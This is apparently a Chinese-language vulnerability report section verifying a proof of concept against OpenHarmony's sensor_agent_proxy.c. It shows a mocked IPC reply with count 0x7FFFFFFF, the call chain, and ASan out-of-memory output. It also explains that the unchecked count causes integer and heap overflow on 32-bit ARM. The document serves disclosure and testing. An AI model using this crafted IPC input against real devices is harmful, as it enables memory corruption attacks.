## PoC 验证

**方法**: Target-Compile — 编译真实 `sensor_agent_proxy.c` 为 `.o`，test driver 通过公共 API 入口 `GetAllSensorsByProxy` 触发完整调用链，mock `IClientProxy` 在 Invoke 中返回恶意 IPC 响应。

**触发路径**:
```
main → GetAllSensorsByProxy(mockProxy, &info, &count)
     → InitSensorList(proxy)
       → client->Invoke(client, GET_ALL_SENSORS, &request, &owner, Notify)
         → MockInvoke: 构造 IPC reply, count=0x7FFFFFFF
           → Notify(owner, 0, &reply)
             → GetSensorInfos(owner, &reply)
               → ReadInt32(&count) = 0x7FFFFFFF (无上界检查)
               → malloc(sizeof(SensorInfo) * 0x7FFFFFFF) = malloc(0x29ffffffac)
               → ASan OOM abort (64-bit) / 整数溢出+堆溢出 (32-bit)
```

**ASan 输出**:
```
==99330==ERROR: AddressSanitizer: out of memory: allocator is trying to allocate 0x29ffffffac bytes
    #0 in malloc
    #1 in GetSensorInfos sensor_agent_proxy.c:149
    #2 in Notify sensor_agent_proxy.c:175
    #3 in MockInvoke poc.c:70
    #4 in InitSensorList sensor_agent_proxy.c:326
    #5 in GetAllSensorsByProxy sensor_agent_proxy.c:343
    #6 in main poc.c:100
SUMMARY: AddressSanitizer: out-of-memory in malloc
==99330==ABORTING
```

**说明**: 64-bit 平台上 `sizeof(SensorInfo) * 0x7FFFFFFF` 不会溢出 `size_t`，表现为 OOM abort。在 OpenHarmony 目标平台（32-bit ARM）上，该乘法溢出 `size_t`，malloc 分配极小缓冲区，后续循环 `memcpy_s` 造成堆缓冲区溢出。

